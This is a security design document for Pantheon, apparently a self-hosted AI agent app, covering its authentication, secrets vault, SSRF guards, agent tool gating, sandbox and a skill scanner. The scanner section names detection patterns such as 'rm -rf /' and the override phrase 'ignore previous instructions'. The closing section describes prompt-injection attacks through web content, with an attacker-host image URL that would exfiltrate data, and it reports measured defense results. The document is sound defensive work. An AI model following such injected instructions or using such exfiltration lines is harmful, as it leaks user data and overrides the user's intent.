# Security

Pantheon is a single-user app that usually runs on localhost. The controls below exist because it holds API keys, runs agent tool calls, and fetches URLs chosen by the model. Everything listed here is implemented in code.

## Authentication (`backend/api/auth.py`, `main.py`)

- **Password:** `AUTH_PASSWORD`. If it is empty, auth is **off** and the DNS-rebinding guard below takes over. `password_matches()` (HMAC compare) is the only password check.
- **Sessions:** `POST /api/auth/login` issues a random 32-byte token. Only its SHA-256 is stored, in `data/db/auth_sessions.db`, and it expires after `AUTH_SESSION_DAYS` (30). Each session is tagged with a fingerprint of `AUTH_PASSWORD`+`SECRET_KEY`, so changing either one logs everything out.
- **Transport:** the `pantheon_session` cookie (`HttpOnly; SameSite=Strict`, `Secure` over HTTPS or `X-Forwarded-Proto: https`), or `Authorization: Bearer <token>` for scripts. **Tokens are never accepted in the query string.**
- **Login throttle:** 10 failures per IP per 5 min, then 429.
- **CSRF:** non-GET requests with a foreign `Origin` (not same-host and not in `CORS_ORIGINS`) get 403.
- **WebSockets** skip the HTTP middleware, so every WS endpoint calls `authorize_websocket(ws)` before `accept()`. It checks the insecure-default lock, `Origin`, the host guard and the session.
- **Auth off:** requests whose `Host` is a public dotted name not listed in `ALLOWED_HOSTS` get 421. IP literals, `localhost` and `.local`/`.lan`/`.internal`/… names are allowed.
- **Public paths:** `/`, health, docs, login, config, logout, and the MCP OAuth callback.

## Insecure-default lockdown

`insecure_defaults()` flags `VAULT_MASTER_KEY`, `SECRET_KEY` or `AUTH_PASSWORD` when they still hold the `config.py` defaults or the `.env.example` placeholders. While any of them do, HTTP returns **503** and WebSockets are refused for every client that isn't loopback. A proxy's `X-Forwarded-For`, `X-Real-IP` or `Forwarded` header counts as remote. `ALLOW_INSECURE_DEFAULTS=true` overrides this.

To change the vault key, run `scripts/rotate_vault_key.py` with the backend stopped. It re-encrypts every secret in one transaction, refuses to run if any secret can't be decrypted, backs up `vault.db` and `.env`, then writes the new key.

## Secrets vault (`backend/secrets/vault.py`)

- Fernet encryption in `data/db/vault.db`.
- **KDF v2:** PBKDF2-SHA256 with 600k iterations over the full `VAULT_MASTER_KEY` and a random per-vault salt stored in `vault_meta`. Older v1 vaults (truncated key, fixed salt, 100k iterations) are re-encrypted on first open.
- `GET /api/secrets` lists key names only, never values.
- **Secrets never follow user-set URLs by name.** A search provider may only reference `search_key__*` or `*_api_key` vault keys (`agent.search_providers.is_search_key_name`). LLM keys are excluded. This is checked on save and on use.

## Outbound fetches (SSRF)

- `utils.net.safe_http_get` resolves the host, blocks non-public addresses on **every redirect hop**, and connects to the IP it validated. The Host header and TLS SNI keep the real name, so DNS rebinding between check and connect doesn't work. Behind an HTTP(S) proxy it skips pinning. `ALLOW_PRIVATE_FETCH=true` opts out.
- **Browser tools** (`BROWSER_ENABLED=true`): `browser_tools._guard_route` runs on every Playwright request. It aborts any request to a non-public host and fetches navigations without following redirects. Tools re-check the page's final URL before returning content.

## Agent tool gating

- **Host exec:** `HOST_EXEC_TOOLS` = `run_command`, `code_execute`, `git_sync_repo`, `git_status`, `git_create_branch`, `git_merge`, `git_commit`, `git_push_pr`. These tools are hidden and refused unless `AgentCore(host_exec=True)`. `AGENT_HOST_EXEC` controls this:
  - `interactive` (default): web chat and `coding_task` only.
  - `always`: every context.
  - `never`: no context.
  Autonomous jobs, scheduled runs, iteration loops and messaging bots are background contexts.
- **Task review:** `create_task(skip_review=true)` is honoured only in interactive web chat. Tasks created from jobs or bots always land as proposals that need approval.
- **Job creation:** `POST /api/jobs` accepts only `autonomous_task`, `iteration_loop` and `coding_task`.
- **Git credentials** are never put in URLs. `_git_auth_env(token)` sets `http.extraheader` through `GIT_CONFIG_*` environment variables.

## Code sandbox (`backend/sandbox/`)

`code_execute` and `run_command` run through `sandbox.get_sandbox()`. It is **not** used by skills (there is no skill executor) or by the `git_*` tools, which call git directly.

| `PANTHEON_SANDBOX` | Backend | Isolation |
|---|---|---|
| `subprocess` (default) | `SubprocessSandbox` | **None beyond limits.** Runs through `ulimit -v`. The environment is filtered to `PATH HOME USER LANG LC_ALL PYTHONPATH NODE_PATH TERM`. Output is capped at 1 MB. Timeouts kill the whole process group. |
| `firecracker` | `FirecrackerSandbox` | A fresh microVM per run (Linux+KVM; set up with `scripts/setup_firecracker.sh`; `FIRECRACKER_DIR`/`FC_DIR`). No jailer. If init fails it falls back to subprocess and logs an error. |

Limits:

- `code_execute`: 30s default (max 300), 256 MB.
- `run_command`: 120s default (max 1800), 4 GB. It runs in the project's repo checkout or workspace, and `workdir` may not escape it.
- With Firecracker, `run_command`'s working directory (the repo checkout) is packed into a second ext4 disk (`mkfs.ext4 -d`), mounted at `/workspace` in the VM, and mirrored back afterwards (`debugfs rdump`). The mirror deletes only files that existed before the run. The VM has no network, so package installs fail there. `FC_MEM_MIB` (default 1024), `FC_VCPUS` and `FC_WORKSPACE_HEADROOM_MB` tune it.

`GET /api/system/sandbox` reports the backend's health.

## Paths and rendering

- **Untrusted names become paths only through `utils.paths`:** `is_within`, `check_project_id` (raises `InvalidProjectId`, returned as 400) and `safe_filename`. Document conversion formats go through `document_converter.validate_format`.
- **Workspace HTML** renders in `SandboxedHtml`: `srcDoc` with `sandbox="allow-scripts"`, no same-origin. Any HTML set via `innerHTML` goes through DOMPurify.

## Messaging bots

Allowlists are deny-by-default. An empty `telegram_allowed_chat_ids`, `slack_allowed_channel_ids`, `discord_allowed_guild_ids`, `matrix_allowed_room_ids` or `mattermost_allowed_channel_ids` means nobody gets a reply. Bots run without host exec. See [messaging.md](messaging.md).

## MCP OAuth

MCP servers can use OAuth 2.1: discovery through Protected Resource Metadata, dynamic client registration and PKCE S256 with a `resource` indicator. Pending `state` expires after 10 min. Tokens are stored in the vault as `mcp_oauth_tokens__<name>`, plus `mcp_oauth_client_secret__<name>` when the server requires a confidential client.

Refreshes are serialized per connection (`_REFRESH_LOCKS`). If the authorization server rejects a refresh, the connection shows `needs_auth`. The callback is a public path; its protection is the PKCE verifier plus `state`.

## Skill scanner and gates

Imported skill bundles can contain arbitrary files, so `skills/scanner.py` scans them in three layers:

1. **Static checks.** Extension allow- and blocklists, size caps (10 MB total, 500 KB per file, 50 files), and regex checks for `os.system`, `shell=True`, `eval`/`exec`, hardcoded credentials and `rm -rf /` (all critical), plus warnings for network, env, obfuscation and deletion patterns. Markdown (`instructions.md`) is checked for prompt-injection phrasing: "ignore previous instructions", bypassing guards and sending credentials are critical; hiding actions from the user is a warning (`INSTRUCTION_PATTERNS`).
2. **Capability analysis.** Compares declared capabilities with what the code appears to do.
3. **AI review** (optional). An LLM (the `extract` class) looks for malicious intent in scripts and for prompt injection in the instructions, including markdown-only skills.

Findings are weighted 0.02 (info), 0.10 (warning) and 0.35 (critical). A scan fails on any critical finding or a score of 0.5 or more.

- **Import** always scans. A failed import, or a failed `POST /skills/{name}/scan`, moves the skill to `data/skills/.quarantine/`. Bundled skills are flagged, never moved.
- **Enable gate:** enabling a non-bundled skill that has no scan or a failed scan returns 403. A failed skill is `scan_blocked`: it is never offered to the agent, `/slug` ignores it, and scheduled runs fail.
- **Scan cache:** results are cached with a content hash, so any file edit invalidates the scan.
- **Scan at load:** any non-bundled skill without a valid scan — new, edited in the editor, or written by hand — gets layers 1–2 when the registry loads (`SkillRegistry._static_scan`, no LLM call), so nothing reaches the prompt unscanned. The `create_skill` agent tool also runs the full scan (with AI review), because the model wrote that text.
- **Override:** `PUT /skills/{name}/toggle` with `force_enable: true` and an `override_password` that matches vault `skill_security_override_password`. The comparison is constant-time and every attempt is logged.
- **Anti-spoofing:** `is_bundled` is set by the loader, never read from `skill.json`. A user skill can't shadow a bundled name, and unquarantine returns 409 on a collision.

## Audit log (`backend/security_log.py`)

Events are written as JSON lines to `<data_dir>/logs/security.log` and also appear on the console. Read or clear the log with `GET` or `DELETE /api/settings/security-log`. Emitted events:

- **Auth:** `auth.login_success`, `auth.login_failure` (bad password, rate limit, bad WS origin or token).
- **Skills:** `skill.scan_passed`, `skill.scan_failed`, `skill.scan_all`, `skill.enabled`, `skill.disabled`, `skill.override_used`, `skill.override_failed`, `skill.quarantined`, `skill.unquarantined`, `skill.deleted`, `skill.name_collision_blocked`.
- **Vault and settings:** `vault.secret_set`, `vault.secret_deleted`, `settings.updated` (key names only).

## Not enforced

- Skill `permissions.network_domains`, `file_paths`, `vault_secrets` and `memory_tiers` are declared only. The scanner reads them; nothing enforces them at runtime.
- The subprocess sandbox is not isolation. Use Firecracker, or `AGENT_HOST_EXEC=never`, if that matters.

## Prompt injection through web content

Web pages, search results, browser and MCP tool output can contain instructions aimed at AI assistants. Two layers:

- **Fenced as data.** Results of those tools reach the model inside `<untrusted_content>` with a note that they are data, not instructions. Chat-template control tokens (`<|im_start|>`, `[INST]` and similar) are defused first, because a local model server may tokenise them as real turn markers.
- **Pasted links are fenced too.** Links in your message are opened before the agent starts (`AGENT_PREFETCH_URLS`), through the same `web_fetch` tool and the same fencing; the step is labelled as reading only, so the page is not treated as a task. Measured: 0/36 attacks succeeded from pre-fetched pages, and no unrequested writes in 60 runs.
- **No remote images in replies.** The chat UI renders markdown images, so an injected `![x](https://attacker/p.png?d=…)` would make the browser send data with zero clicks. Replies show such images as text ("image not shown … external image from host") unless your own message contained the URL.

Measured with fixture attack pages (overrides, fake system blocks, silent memory poisoning, data-exfiltration fetches and images, hidden endorsements, malicious install commands): held-out attacks that succeeded went from 4/18 to 0/18, and the user's actual request was handled 18/18 instead of 14/18.

